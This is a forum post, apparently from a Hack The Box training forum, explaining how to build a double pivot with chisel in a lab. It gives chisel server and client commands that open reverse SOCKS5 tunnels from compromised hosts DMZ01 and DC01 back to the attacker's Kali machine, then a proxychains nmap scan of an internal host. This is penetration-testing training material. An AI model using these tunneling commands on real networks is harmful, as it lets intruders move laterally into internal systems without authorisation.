
# Attacking enterprise networks double pivot using chisel

At the end of “Attacking Enterprise Networks” the module “Post-Exploitation” describes how to set up MSF autoroute to perform a double pivot and proxy traffic over 2 intermediate hops:

> `Attack host` --> `dmz01` --> `DC01` --> `MGMT01`

I am currently trying to figure out how to perform the same task with chisel through installation of a client / server process on the DMZ jump host.
Is there anyone who has tried that out successfully?

---

Tried several configuration in the Lab Environment and finally got a Chisel Double Pivot to work!

We are connecting via
> Kali (10.10.14.227) <<10.10.14.0/24>> DMZ01 (10.129.58.6 | 172.16.8.120) <<192.16.8.0/24>> DC01 (172.16.8.3 | 172.16.9.3) <<172.16.9.0/24>> MGMT01 (172.16.9.25)

### On our local Kali:
```
./chisel_linux server --socks5 -p 9001 --reverse
/etc/proxychains

socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
```
### DMZ01:
```
./chisel_linux client 10.10.14.227:9001 R:9999:socks
./chisel_linux server  -p 9002 --reverse --socks5 
```
### DC01:
```
chisel.exe client 172.16.8.120:9002 R:8888:socks
```
Now close any Socks4 connection (e.g. SSH Dynamic Port Forward) and comment in /etc/proxychains

#socks4 127.0.0.1 9050

Scan Target **MGMT01** via socks5 proxy:

### FROM our local Kali:
```
┌──(kali㉿kali)-[~]
└─$ proxychains nmap -sT -p 22 172.16.9.25                                                    
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-11 17:27 EST
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888  ...  172.16.9.25:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  127.0.0.1:8888  ...  172.16.9.25:22  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.9.25
Host is up (14s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
```

# Reference:
[attacking-enterprise-networks-double-pivot-using-chisel](https://forum.hackthebox.com/t/attacking-enterprise-networks-double-pivot-using-chisel/267043/4)

